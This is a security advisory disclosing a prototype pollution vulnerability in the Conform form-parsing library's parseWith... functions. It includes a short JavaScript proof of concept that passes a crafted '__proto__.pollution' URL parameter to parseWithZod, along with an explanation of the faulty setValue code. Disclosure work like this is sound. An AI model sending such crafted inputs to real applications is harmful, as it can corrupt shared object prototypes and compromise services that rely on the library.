summary: "Conform contains a Prototype Pollution Vulnerability in `parseWith...` function\n\
  ### Summary\nConform allows the parsing of nested objects in the form of `object.property`.\
  \ Due to an improper implementation of this feature, an attacker can exploit it to trigger\
  \ prototype pollution by passing a crafted input to `parseWith...` functions.\n\n### PoC\n\
  ```javascript\nconst { parseWithZod } = require('@conform-to/zod');\nconst { z } = require(\"\
  zod\"); \n\nconst param = new URLSearchParams(\"__proto__.pollution=polluted\");\nconst schema\
  \ = z.object({ \"a\": z.string() });\n\nparseWithZod(param, { schema });\nconsole.log(\"pollution:\"\
  , ({}).pollution); // should print \"polluted\"\n```\n\n### Details\n\nThe invocation of the\
  \ `parseWithZod` function in the above PoC triggers the `setValue` function through `getSubmissionContext`\
  \ and `parse`, executing the following process, resulting in prototype pollution:\n\n```javascript\n\
  let pointer = value;\n\npointer.__proto__ = pointer.__proto__;\npointer = pointer.__proto__;\n\
  \npointer.polluted = \"polluted\";\n```\n\nThis is caused by the lack of object existence\
  \ checking on [line 117 in formdata.ts](https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117),\
  \ where the code only checks for the presence of `pointer[key]` without proper validation.\n\
  \n### Impact\nApplications that use conform for server-side validation of form data or URL\
  \ parameters are affected by this vulnerability."
